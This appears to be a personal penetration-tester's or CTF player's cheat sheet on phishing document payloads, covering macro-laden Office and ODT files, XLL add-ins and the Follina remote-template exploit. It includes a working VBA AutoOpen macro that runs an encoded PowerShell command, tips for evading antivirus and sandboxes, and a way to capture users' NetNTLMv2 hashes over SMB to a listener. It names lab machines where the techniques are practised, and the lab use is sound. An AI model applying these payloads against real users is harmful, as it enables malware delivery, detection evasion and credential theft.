# Phishing payloads

## Pick the carrier
- [ ] An Office document with a macro: the classic, and it still works wherever macros are allowed
- [ ] An XLL, an Excel add-in: no macro banner, only an add-in prompt, so it passes a policy that blocks VBA
- [ ] An ODT with a macro: a weaker warning than a .doc gets
- [ ] A Follina-style remote template: no macro at all, but a patched estate stops it

## VBA AutoOpen
Alt+F11, then in ThisDocument, with THE-BASE64 the encoded command from :Pb shells:
Sub AutoOpen()
    Shell "powershell -e THE-BASE64"
End Sub
- [ ] AutoOpen runs when the document opens; Document_Open is Word's own name for the same
- [ ] Antivirus matches the obvious strings: powershell split and joined again, and no payload left readable
- [ ] The whole chain tried on a machine of my own first: a macro that errors wastes the one chance

## XLL
- [ ] Any DLL that exports xlAutoOpen, renamed to .xll: a double click loads it into Excel
- [ ] The user sees an add-in prompt, not a macro warning, and it is one click either way
- [ ] The payload goes in xlAutoOpen, with DllMain left quiet

## Follina, CVE-2022-30190
- [ ] A .docx whose document.xml.rels pulls a remote template that holds an ms-msdt: URI: code runs with no macro at all
- [ ] Only on Office from before the fix of June 2022: the estate checked before I count on it

## Two results from one document
- [ ] The document can also call home over SMB: the payload runs, and the user's NetNTLMv2 response reaches my listener, as in :Pb responder
- [ ] Sandbox checks before the real stage: is the host domain-joined, does the mouse move, and a sleep longer than a sandbox waits
- [ ] The payload: staged PowerShell to a listener, or :Pb metasploit where I may use it

## Boxes that teach it
- [ ] Axlle: an XLL sent to someone who reads mail
- [ ] Job and Job2: VBA AutoOpen in LibreOffice documents
